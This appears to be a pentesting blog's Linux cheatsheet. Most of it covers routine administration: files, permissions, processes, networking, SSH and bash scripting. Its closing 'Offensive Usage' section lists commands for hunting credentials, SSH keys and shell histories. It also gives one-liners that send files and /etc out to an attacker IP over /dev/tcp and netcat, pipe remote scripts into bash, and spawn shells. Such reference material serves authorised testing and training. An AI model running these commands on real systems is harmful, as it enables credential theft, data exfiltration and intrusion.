---
layout: post
title: "linux cheatsheet"
description: "A comprehensive Linux reference — navigation, file management, networking, processes, permissions, and offensive usage."
---

> **Disclaimer:** This cheatsheet is for authorised penetration testing and educational purposes only. Never use these techniques against systems you do not own or have explicit written permission to test.

---

## Table of Contents

- [Navigation & File System](#navigation--file-system)
- [File Operations](#file-operations)
- [File Permissions](#file-permissions)
- [Users & Groups](#users--groups)
- [Processes](#processes)
- [Networking](#networking)
- [Services](#networking)
- [Package Management](#package-management)
- [Searching & Finding](#searching--finding)
- [Text Processing](#text-processing)
- [Archiving & Compression](#archiving--compression)
- [Disk & Storage](#disk--storage)
- [SSH](#ssh)
- [Bash Scripting](#bash-scripting)
- [Offensive Usage](#offensive-usage)

---

## Navigation & File System

```bash
pwd                        # print working directory
ls                         # list directory contents
ls -la                     # long format, show hidden files
ls -lah                    # human readable file sizes
cd /path/to/dir            # change directory
cd ~                       # go to home directory
cd -                       # go to previous directory
tree                       # display directory tree
tree -L 2                  # limit depth to 2 levels

# Filesystem layout
/                          # root
/etc                       # system config files
/var                       # variable data — logs, databases
/tmp                       # temporary files, world-writable
/home                      # user home directories
/root                      # root user home
/opt                       # optional/third-party software
/usr/bin                   # user binaries
/usr/local/bin             # locally installed binaries
/proc                      # virtual filesystem — running processes
/dev                       # device files
```

---

## File Operations

```bash
# Create
touch file.txt             # create empty file
mkdir dir                  # create directory
mkdir -p dir/subdir        # create nested directories

# Copy & Move
cp file.txt /tmp/          # copy file
cp -r dir/ /tmp/           # copy directory recursively
mv file.txt /tmp/          # move file
mv file.txt newname.txt    # rename file

# Delete
rm file.txt                # delete file
rm -rf dir/                # delete directory recursively (careful!)
rmdir dir                  # delete empty directory

# View file contents
cat file.txt               # print entire file
less file.txt              # paginated view
head file.txt              # first 10 lines
head -n 20 file.txt        # first 20 lines
tail file.txt              # last 10 lines
tail -f file.txt           # follow file in real time (great for logs)
tail -n 50 file.txt        # last 50 lines

# File info
file file.txt              # determine file type
stat file.txt              # detailed file metadata
wc -l file.txt             # count lines
wc -w file.txt             # count words
du -sh dir/                # directory size
ls -lh file.txt            # file size human readable

# Links
ln -s /path/to/file link   # create symbolic link
ln file hardlink           # create hard link
readlink -f link           # resolve symlink to real path
```

---

## File Permissions

```bash
# Permission format: [type][owner][group][others]
# e.g. -rwxr-xr-- = file, owner rwx, group r-x, others r--

# chmod — change permissions
chmod 755 file             # rwxr-xr-x
chmod 644 file             # rw-r--r--
chmod 600 file             # rw------- (private key permissions)
chmod +x file              # add execute for all
chmod -x file              # remove execute for all
chmod u+x file             # add execute for owner only
chmod -R 755 dir/          # recursive

# chown — change ownership
chown user file            # change owner
chown user:group file      # change owner and group
chown -R user:group dir/   # recursive

# Special permissions
chmod u+s file             # set SUID bit
chmod g+s file             # set SGID bit
chmod +t dir               # set sticky bit (e.g. /tmp)

# View permissions numerically
stat -c "%a %n" file       # shows e.g. 755 filename

# Find files by permission (useful for privesc)
find / -perm -4000 2>/dev/null   # SUID files
find / -perm -2000 2>/dev/null   # SGID files
find / -perm -0002 2>/dev/null   # world-writable files
find / -perm -0002 -type f 2>/dev/null  # world-writable files only
```

---

## Users & Groups

```bash
# Current user info
whoami                     # current username
id                         # uid, gid, and groups
groups                     # list groups current user belongs to

# User management
cat /etc/passwd            # list all users
cat /etc/shadow            # hashed passwords (requires root)
cat /etc/group             # list all groups

# Add / modify users
useradd username           # create user
useradd -m -s /bin/bash username  # create user with home dir and bash shell
passwd username            # set password
usermod -aG sudo username  # add user to sudo group
usermod -aG group username # add user to group
userdel -r username        # delete user and home directory

# Switch users
su username                # switch to user (requires password)
su -                       # switch to root
sudo -l                    # list sudo permissions for current user
sudo -u username command   # run command as another user
sudo su                    # switch to root via sudo

# Who is logged in
who                        # currently logged in users
w                          # logged in users with activity
last                       # login history
lastlog                    # last login for all users
```

---

## Processes

```bash
# View processes
ps aux                     # all running processes
ps aux | grep apache       # filter processes
top                        # real-time process monitor
htop                       # interactive process monitor (nicer)
pgrep nginx                # get PID of process by name
pidof apache2              # get PID of process

# Manage processes
kill PID                   # send SIGTERM (graceful stop)
kill -9 PID                # send SIGKILL (force stop)
killall nginx              # kill all processes by name
pkill -f pattern           # kill processes matching pattern

# Background / foreground
command &                  # run in background
Ctrl+Z                     # suspend foreground process
bg                         # resume suspended process in background
fg                         # bring background process to foreground
jobs                       # list background jobs
nohup command &            # run immune to hangup (survives logout)

# Process info
lsof -p PID                # files opened by process
lsof -i :80                # process using port 80
strace -p PID              # trace system calls of running process
/proc/PID/cmdline          # command that started the process
/proc/PID/environ          # environment variables of process
cat /proc/PID/maps         # memory map
```

---

## Networking

```bash
# Interface info
ip a                       # show all interfaces and IPs
ip r                       # show routing table
ifconfig                   # legacy interface info

# Connectivity
ping -c 4 8.8.8.8          # ping 4 times
traceroute 8.8.8.8         # trace route to host
curl -I http://target.com  # fetch HTTP headers only
curl -L http://target.com  # follow redirects
wget http://target.com/file.txt  # download file

# DNS
dig target.com             # DNS lookup
dig target.com MX          # mail records
dig +short target.com      # just the IP
nslookup target.com        # legacy DNS lookup
host target.com            # simple DNS lookup

# Open ports & connections
ss -tulpn                  # listening ports with process names
netstat -tulpn             # legacy equivalent
netstat -ano               # all connections with PIDs
lsof -i                    # all network connections
lsof -i :443               # what's on port 443

# Firewall
iptables -L -n -v          # list all rules
iptables -A INPUT -p tcp --dport 4444 -j ACCEPT   # allow port
ufw status                 # UFW firewall status
ufw allow 22               # allow SSH

# Packet capture
tcpdump -i eth0            # capture on interface
tcpdump -i eth0 port 80    # capture HTTP traffic
tcpdump -i eth0 -w out.pcap  # write to file
tcpdump -r out.pcap        # read from file
```

---

## Services

```bash
# systemctl — manage services
systemctl status nginx     # check service status
systemctl start nginx      # start service
systemctl stop nginx       # stop service
systemctl restart nginx    # restart service
systemctl enable nginx     # enable on boot
systemctl disable nginx    # disable on boot
systemctl list-units --type=service  # list all services

# Logs
journalctl -u nginx        # logs for specific service
journalctl -f              # follow system logs
journalctl -xe             # recent logs with context
cat /var/log/syslog        # system log
cat /var/log/auth.log      # authentication log
cat /var/log/apache2/access.log   # Apache access log
tail -f /var/log/auth.log  # follow auth log in real time
```

---

## Package Management

```bash
# Debian / Ubuntu (apt)
apt update                 # update package index
apt upgrade                # upgrade installed packages
apt install package        # install package
apt remove package         # remove package
apt purge package          # remove package and config files
apt search keyword         # search for package
apt show package           # show package info
dpkg -l                    # list installed packages
dpkg -i package.deb        # install .deb file

# Red Hat / CentOS (yum/dnf)
yum update                 # update packages
yum install package        # install package
yum remove package         # remove package
dnf install package        # modern equivalent

# General
which python3              # locate a binary
whereis python3            # locate binary, source, man page
type curl                  # show how command is resolved
```

---

## Searching & Finding

```bash
# find — search filesystem
find / -name "flag.txt" 2>/dev/null          # find by name
find / -name "*.conf" 2>/dev/null            # find by extension
find /home -user nathan 2>/dev/null          # find by owner
find / -size +10M 2>/dev/null               # files larger than 10MB
find / -newer /tmp/ref 2>/dev/null          # files newer than ref
find / -mmin -60 2>/dev/null                # modified in last 60 mins
find / -type f -writable 2>/dev/null        # writable files
find / -type d -writable 2>/dev/null        # writable directories
find / -perm -4000 2>/dev/null              # SUID files

# grep — search file contents
grep "password" file.txt                    # search in file
grep -r "password" /var/www/ 2>/dev/null    # recursive search
grep -ri "password" /etc/ 2>/dev/null       # case insensitive
grep -rn "password" /var/www/               # show line numbers
grep -v "root" /etc/passwd                  # invert match (exclude)
grep -E "user|pass" file.txt                # regex — match either
grep -l "password" /etc/*.conf              # show only filenames

# locate — fast file search (uses database)
locate flag.txt
updatedb                                    # update locate database

# which / whereis
which python3
whereis nc
```

---

## Text Processing

```bash
# cat, head, tail — already covered above

# cut — extract columns
cut -d: -f1 /etc/passwd    # extract first field (delimiter :)
cut -d, -f2 file.csv       # extract second CSV column

# awk — powerful text processing
awk '{print $1}' file.txt             # print first column
awk -F: '{print $1}' /etc/passwd      # use : as delimiter
awk -F: '{print $1,$3}' /etc/passwd   # print columns 1 and 3
awk '/root/ {print}' /etc/passwd      # print lines matching root
awk '{sum+=$1} END {print sum}' file  # sum first column

# sed — stream editor
sed 's/old/new/g' file.txt            # replace all occurrences
sed -i 's/old/new/g' file.txt         # in-place replacement
sed -n '10,20p' file.txt              # print lines 10-20
sed '/pattern/d' file.txt             # delete matching lines

# sort & uniq
sort file.txt                         # sort alphabetically
sort -n file.txt                      # sort numerically
sort -r file.txt                      # reverse sort
sort -u file.txt                      # sort and remove duplicates
uniq file.txt                         # remove consecutive duplicates
sort file.txt | uniq -c               # count occurrences
sort file.txt | uniq -c | sort -rn    # frequency count, most common first

# tr — translate/replace characters
tr 'a-z' 'A-Z' < file.txt            # lowercase to uppercase
tr -d '\r' < file.txt                 # remove carriage returns
echo "hello" | tr 'a-z' 'A-Z'

# Other useful tools
wc -l file.txt                        # count lines
diff file1 file2                      # compare files
comm file1 file2                      # compare sorted files
tee output.txt                        # write to file and stdout simultaneously
xargs                                 # build commands from stdin
cat urls.txt | xargs curl -O          # download all URLs in file
```

---

## Archiving & Compression

```bash
# tar
tar -cvf archive.tar dir/             # create archive
tar -xvf archive.tar                  # extract archive
tar -czvf archive.tar.gz dir/         # create gzip compressed archive
tar -xzvf archive.tar.gz              # extract gzip archive
tar -cjvf archive.tar.bz2 dir/        # create bzip2 archive
tar -xjvf archive.tar.bz2             # extract bzip2 archive
tar -tvf archive.tar                  # list contents without extracting

# gzip / gunzip
gzip file.txt                         # compress (replaces file)
gunzip file.txt.gz                    # decompress
gzip -k file.txt                      # compress, keep original

# zip / unzip
zip archive.zip file1 file2           # create zip
zip -r archive.zip dir/               # zip directory
unzip archive.zip                     # extract zip
unzip -l archive.zip                  # list contents
unzip archive.zip -d /tmp/            # extract to specific dir
```

---

## Disk & Storage

```bash
df -h                      # disk space usage — human readable
du -sh /var/log            # size of directory
du -sh * | sort -rh        # size of all items, sorted largest first
lsblk                      # list block devices
fdisk -l                   # list partitions (requires root)
mount                      # show mounted filesystems
cat /proc/mounts           # all mounts
free -h                    # RAM and swap usage
```

---

## SSH

```bash
# Connect
ssh user@10.10.10.1                          # basic connection
ssh -p 2222 user@10.10.10.1                  # custom port
ssh -i id_rsa user@10.10.10.1               # connect with private key
ssh -v user@10.10.10.1                       # verbose (debug)

# Key management
ssh-keygen -t rsa -b 4096                    # generate RSA key pair
ssh-keygen -t ed25519                        # generate Ed25519 key pair (preferred)
ssh-copy-id user@10.10.10.1                  # copy public key to server
cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys  # manual key install

# Fix key permissions
chmod 700 ~/.ssh
chmod 600 ~/.ssh/id_rsa
chmod 644 ~/.ssh/id_rsa.pub
chmod 600 ~/.ssh/authorized_keys

# SCP — file transfer over SSH
scp file.txt user@10.10.10.1:/tmp/           # upload file
scp user@10.10.10.1:/etc/passwd ./           # download file
scp -r dir/ user@10.10.10.1:/tmp/            # upload directory
scp -i id_rsa file.txt user@10.10.10.1:/tmp/ # with key

# Tunnelling
ssh -L 8080:127.0.0.1:80 user@10.10.10.1    # local port forward
ssh -R 4444:127.0.0.1:4444 user@10.10.10.1  # remote port forward
ssh -D 1080 user@10.10.10.1                  # dynamic SOCKS proxy
ssh -J jumphost user@internal                # jump host / bastion
```

---

## Bash Scripting

```bash
#!/bin/bash

# Variables
name="r00t26"
echo "Hello $name"
echo "Hello ${name}!"      # use braces for clarity

# User input
read -p "Enter IP: " ip
echo "Scanning $ip"

# Conditionals
if [ "$name" == "root" ]; then
  echo "You are root"
elif [ "$name" == "admin" ]; then
  echo "You are admin"
else
  echo "Unknown user"
fi

# File checks
if [ -f "/etc/passwd" ]; then echo "file exists"; fi
if [ -d "/tmp" ]; then echo "directory exists"; fi
if [ -r "/etc/shadow" ]; then echo "shadow is readable!"; fi
if [ -w "/etc/passwd" ]; then echo "passwd is writable!"; fi
if [ -x "/usr/bin/python3" ]; then echo "python3 is executable"; fi

# Loops
for i in 1 2 3 4 5; do
  echo "Number: $i"
done

for file in /etc/*.conf; do
  echo "$file"
done

# While loop
counter=0
while [ $counter -lt 5 ]; do
  echo "Count: $counter"
  ((counter++))
done

# Functions
scan_host() {
  echo "Scanning $1..."
  nmap -sV "$1"
}
scan_host 10.10.10.1

# Command substitution
current_user=$(whoami)
ip_addr=$(hostname -I | awk '{print $1}')

# Exit codes
command && echo "success" || echo "failed"
command; echo "Exit code: $?"

# Redirect output
command > output.txt       # stdout to file
command >> output.txt      # append stdout
command 2>/dev/null        # discard stderr
command 2>&1 | tee out.txt # stdout and stderr to file and screen

# String operations
str="Hello World"
echo ${#str}               # length
echo ${str:0:5}            # substring (Hello)
echo ${str/World/HTB}      # replace
echo ${str,,}              # lowercase
echo ${str^^}              # uppercase

# Arrays
hosts=("10.10.10.1" "10.10.10.2" "10.10.10.3")
echo ${hosts[0]}           # first element
echo ${hosts[@]}           # all elements
echo ${#hosts[@]}          # array length
for host in "${hosts[@]}"; do
  ping -c 1 "$host" &>/dev/null && echo "$host is up"
done
```

---

## Offensive Usage

### Situational Awareness

```bash
# Who are we and where
id && whoami && hostname
uname -a                              # kernel version
cat /etc/os-release                   # distro info
cat /proc/version
env                                   # environment variables — look for creds
echo $PATH                            # PATH variable — hijacking opportunities

# Network context
ip a && ip r
ss -tulpn                             # open ports / listening services
cat /etc/hosts                        # internal hostnames
cat /etc/resolv.conf                  # DNS servers
arp -a                                # ARP cache — other hosts on network
```

### Credential Hunting

```bash
# Config and env files
find / -name "*.env" 2>/dev/null
find / -name "*.conf" 2>/dev/null | xargs grep -l "pass" 2>/dev/null
find / -name "wp-config.php" 2>/dev/null    # WordPress DB creds
find / -name "config.php" 2>/dev/null
find / -name "database.yml" 2>/dev/null
find / -name "settings.py" 2>/dev/null      # Django

# Shell history
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.mysql_history
cat ~/.psql_history

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# Passwords in files
grep -ri "password" /var/www/ 2>/dev/null
grep -ri "passwd" /opt/ 2>/dev/null
grep -ri "DB_PASS" / 2>/dev/null
grep -ri "secret" /etc/ 2>/dev/null
grep -ri "api_key" /var/www/ 2>/dev/null

# KeePass databases
find / -name "*.kdbx" 2>/dev/null
```

### Interesting Files & Directories

```bash
# Writable directories — good for dropping files
find / -type d -writable 2>/dev/null | grep -v proc

# Recently modified files — what changed?
find / -mmin -10 -type f 2>/dev/null           # last 10 minutes
find /etc -mtime -1 2>/dev/null                # last 24 hours

# Backup files — often contain old credentials
find / -name "*.bak" 2>/dev/null
find / -name "*.backup" 2>/dev/null
find / -name "*.old" 2>/dev/null
find / -name "*.orig" 2>/dev/null

# Database files
find / -name "*.sqlite" 2>/dev/null
find / -name "*.db" 2>/dev/null

# Log files — credentials in logs are common
ls -la /var/log/
cat /var/log/auth.log | grep -i "password\|accepted\|failed"
```

### Living off the Land

```bash
# File transfer without wget/curl
# Python HTTP server
python3 -m http.server 80

# Base64 encode and transfer
base64 -w 0 file.exe                          # encode on attacker
echo "BASE64STRING" | base64 -d > file.exe    # decode on target

# /dev/tcp — transfer without tools
cat file > /dev/tcp/10.10.14.5/4444           # send file
# On attacker: nc -lvnp 4444 > received_file

# Execution without writing to disk
curl http://10.10.14.5/script.sh | bash
wget -qO- http://10.10.14.5/script.sh | bash

# Useful binaries for data exfil
xxd file.bin | nc 10.10.14.5 4444             # hex dump over netcat
tar czf - /etc | nc 10.10.14.5 4444           # tar directory over netcat

# Spawn shells from restricted environments
python3 -c 'import pty; pty.spawn("/bin/bash")'
script /dev/null -c bash                       # alternative TTY spawn
echo os.system('/bin/bash')
/bin/sh -i
```

### Useful One-Liners

```bash
# Find all users with login shells
grep -v nologin /etc/passwd | grep -v false

# List all SUID binaries — check GTFOBins
find / -perm -u=s -type f 2>/dev/null

# Check capabilities
getcap -r / 2>/dev/null

# Find cron jobs
cat /etc/crontab
ls -la /etc/cron*
crontab -l
find / -name "*.cron" 2>/dev/null

# Check sudo rights
sudo -l

# Check for passwords in running processes
ps aux | grep -i "pass\|pwd\|-p "

# Port scan from target (no nmap)
for port in 21 22 23 25 80 443 445 3306 3389 8080; do
  (echo >/dev/tcp/10.10.10.1/$port) 2>/dev/null && echo "$port open"
done

# Ping sweep from target (no nmap)
for i in $(seq 1 254); do
  ping -c 1 -W 1 192.168.1.$i &>/dev/null && echo "192.168.1.$i is up"
done
```
